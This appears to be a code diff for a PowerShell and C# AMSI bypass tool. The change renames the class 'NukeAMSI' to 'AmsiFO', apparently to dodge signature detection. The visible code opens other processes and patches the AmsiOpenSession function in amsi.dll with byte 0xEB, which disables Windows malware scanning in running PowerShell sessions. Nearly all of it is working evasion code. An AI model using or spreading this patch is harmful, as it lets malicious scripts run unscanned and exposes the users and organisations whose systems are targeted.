@@ -7,7 +7,7 @@ using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-public class NukeAMSI
+public class AmsiFO
 {
     public const int PROCESS_VM_OPERATION = 0x0008;
     public const int PROCESS_VM_READ = 0x0010;
@@ -67,14 +67,14 @@ function ModAMSI {
 
     $patch = [byte]0xEB  # The patch byte to modify AMSI behavior
 
-    $objectAttributes = New-Object NukeAMSI+OBJECT_ATTRIBUTES
-    $clientId = New-Object NukeAMSI+CLIENT_ID
+    $objectAttributes = New-Object AmsiFO+OBJECT_ATTRIBUTES
+    $clientId = New-Object AmsiFO+CLIENT_ID
     $clientId.UniqueProcess = [IntPtr]$processId
     $clientId.UniqueThread = [IntPtr]::Zero
     $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)
 
     $hHandle = [IntPtr]::Zero
-    $status = [NukeAMSI]::NtOpenProcess([ref]$hHandle, [NukeAMSI]::PROCESS_VM_OPERATION -bor [NukeAMSI]::PROCESS_VM_READ -bor [NukeAMSI]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)
+    $status = [AmsiFO]::NtOpenProcess([ref]$hHandle, [AmsiFO]::PROCESS_VM_OPERATION -bor [AmsiFO]::PROCESS_VM_READ -bor [AmsiFO]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)
 
     if ($status -ne 0) {
         Write-Host "Failed to open process. NtOpenProcess status: $status" -ForegroundColor Red
@@ -82,18 +82,18 @@ function ModAMSI {
     }
 
     Write-Host "Loading amsi.dll..." -ForegroundColor Cyan
-    $amsiHandle = [NukeAMSI]::LoadLibrary("amsi.dll")
+    $amsiHandle = [AmsiFO]::LoadLibrary("amsi.dll")
     if ($amsiHandle -eq [IntPtr]::Zero) {
         Write-Host "Failed to load amsi.dll." -ForegroundColor Red
-        [NukeAMSI]::NtClose($hHandle)
+        [AmsiFO]::NtClose($hHandle)
         return
     }
 
     Write-Host "Getting address of AmsiOpenSession function..." -ForegroundColor Cyan
-    $amsiOpenSession = [NukeAMSI]::GetProcAddress($amsiHandle, "AmsiOpenSession")
+    $amsiOpenSession = [AmsiFO]::GetProcAddress($amsiHandle, "AmsiOpenSession")
     if ($amsiOpenSession -eq [IntPtr]::Zero) {
         Write-Host "Failed to find AmsiOpenSession function in amsi.dll." -ForegroundColor Red
-        [NukeAMSI]::NtClose($hHandle)
+        [AmsiFO]::NtClose($hHandle)
         return
     }
 
@@ -103,17 +103,17 @@ function ModAMSI {
     Write-Host "Changing memory protection at address $patchAddr to PAGE_EXECUTE_READWRITE..." -ForegroundColor Cyan
     $oldProtect = [UInt32]0
     $size = [UIntPtr]::new(1)  # Correct conversion to UIntPtr
-    $protectStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, [NukeAMSI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
+    $protectStatus = [AmsiFO]::VirtualProtectEx($hHandle, $patchAddr, $size, [AmsiFO]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
 
     if (-not $protectStatus) {
         Write-Host "Failed to change memory protection." -ForegroundColor Red
-        [NukeAMSI]::NtClose($hHandle)
+        [AmsiFO]::NtClose($hHandle)
         return
     }
 
     Write-Host "Patching memory at address $patchAddr with byte 0xEB..." -ForegroundColor Cyan
     $bytesWritten = [System.UInt32]0
-    $status = [NukeAMSI]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)
+    $status = [AmsiFO]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)
 
     if ($status -eq 0) {
         Write-Host "Memory patched successfully at address $patchAddr." -ForegroundColor Green
@@ -122,14 +122,14 @@ function ModAMSI {
     }
 
     Write-Host "Restoring original memory protection..." -ForegroundColor Cyan
-    $restoreStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)
+    $restoreStatus = [AmsiFO]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)
 
     if (-not $restoreStatus) {
         Write-Host "Failed to restore memory protection." -ForegroundColor Red
     }
 
     Write-Host "Closing handle to process with ID $processId." -ForegroundColor Cyan
-    [NukeAMSI]::NtClose($hHandle)
+    [AmsiFO]::NtClose($hHandle)
 }
 
 function ModAllPShells {
